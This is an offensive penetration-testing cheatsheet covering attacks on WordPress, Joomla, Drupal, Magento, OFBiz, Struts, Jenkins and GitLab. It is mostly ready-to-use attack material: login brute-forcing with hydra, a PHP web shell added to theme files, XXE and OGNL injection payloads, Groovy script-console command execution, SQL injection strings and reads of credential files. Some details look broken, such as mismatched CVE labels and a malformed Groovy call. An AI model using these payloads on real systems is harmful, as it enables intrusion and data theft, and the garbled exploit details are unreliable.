# Attacking Common Applications

## WordPress

### Enumeration

| Command | Purpose |
|---|---|
| `wpscan --url http://target.com` | WordPress vulnerability scanner |
| `wpscan --url http://target.com -e u` | Enumerate users |
| `curl -s http://target.com/wp-json/wp/v2/users` | List users via REST API |
| `curl -s http://target.com/?author=1` | Enumerate users by ID |

### Plugin/Theme Enumeration

```bash
# Find active plugins
curl -s http://target.com | grep -oP "wp-content/plugins/\K[^/]+" | sort -u

# Check plugin versions
curl -s http://target.com/wp-content/plugins/<PLUGIN>/readme.txt | grep "Stable tag"

# Known vulnerable plugins
wpscan --url http://target.com --enumerate vp  # Vulnerable plugins
wpscan --url http://target.com --enumerate vt  # Vulnerable themes
```

### Exploitation

| Vulnerability | Exploitation |
|---|---|
| Weak admin password | `hydra -L users.txt -P passwords.txt http://target.com/wp-login.php http-post-form` |
| Plugin RCE | `wpscan --url http://target.com -e ap` (find vulnerable plugins) |
| Theme RCE | Edit theme files via admin panel or direct upload |
| Unauthenticated file upload | `wpscan --enumerate ap --url http://target.com` |
| SQL Injection | Use SQLMap on comment forms, search, etc. |

### Reverse Shell via WordPress

```bash
# Method 1: Theme editor
# Login → Appearance → Theme File Editor → edit functions.php
# Add: exec($_GET['c']);

# Method 2: Plugin upload
# Create shell.php, compress to shell.zip
# Admin → Plugins → Upload → activate

# Method 3: XML-RPC brute force (if enabled)
python3 wpscan.py --url http://target.com --xmlrpc-brute -U admin -P passwords.txt
```

## Joomla

### Enumeration

| Command | Purpose |
|---|---|
| `curl -s http://target.com/administrator/manifests/files/joomla.xml` | Get Joomla version |
| `curl -s http://target.com/components/` | Enumerate components |
| `joomscan -u http://target.com` | Joomla scanner |

### Common Vulnerabilities

| Issue | Exploitation |
|---|---|
| **CVE-2023-42817** | Privilege escalation via ACL bypass |
| **File inclusion** | `/index.php?tmpl=component&...` |
| **SQL Injection** | Test category, menu, component parameters |
| **Default credentials** | admin/admin (sometimes still present) |

## Drupal

### Enumeration

| Command | Purpose |
|---|---|
| `curl -s http://target.com/CHANGELOG.txt` | Get Drupal version |
| `curl -s http://target.com/modules/` | Enumerate modules |
| `drupscan -u http://target.com` | Drupal scanner |

### Module Exploitation

```bash
# CVE-2018-7600 (Drupalgeddon 2) - Unauthenticated RCE
# Affects Drupal 7.x, 8.x < 8.5
python3 exploit.py http://target.com

# SQL Injection via views
# Test /node/?name=admin' OR 1=1--
```

## Magento (eCommerce)

### Enumeration

```bash
# Identify Magento
curl -s http://target.com/magento_version
curl -s http://target.com/app/etc/local.xml  # Database credentials (if accessible)

# Check admin panel
curl -s http://target.com/admin/
curl -s http://target.com/index.php/admin/
```

### Common Vulnerabilities

| Issue | Command |
|---|---|
| Unencrypted cookies | Capture session, modify user ID in database |
| Weak encryption | Check `/app/etc/local.xml` for encryption keys |
| Template injection | `{{7*7}}` in product description or email |
| SQL Injection | Test search, category filters, API endpoints |

## Apache OFBiz

### RCE (CVE-2023-49070)

```bash
# Unauthenticated RCE via XXE
curl -X POST "http://target.com:8443/webtools/control/main" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

## Apache Struts

### RCE (CVE-2017-5645)

```bash
# OGNL injection
curl 'http://target.com/path?param=%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%28%27cmd.exe%27%2C%27%2Fc%27%29%3A%28%27bash%27%2C%27-c%27%29%29%29'
```

## Jenkins

### Unauthenticated RCE

```bash
# Groovy script injection (if allowed)
curl -X POST http://target.com:8080/script \
  -d 'println("java.lang.Runtime".getRuntime().exec("id"))'

# Script console RCE
http://target.com:8080/script  # If accessible without auth
```

## GitLab / GitHub Enterprise

### Enumeration

```bash
# Check version
curl -s http://target.com/api/v4/version

# Enumerate users
curl -s http://target.com/api/v4/users

# Find projects
curl -s http://target.com/api/v4/projects
```

### Common Misconfigurations

| Issue | Risk |
|---|---|
| Public repository with credentials | GitHub secrets exposure |
| SSH key in repo history | Account takeover |
| CI/CD secrets exposed | Privilege escalation |
| Default credentials | Admin access |

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README-CHEATSHEETS.md) collection.*

</div>
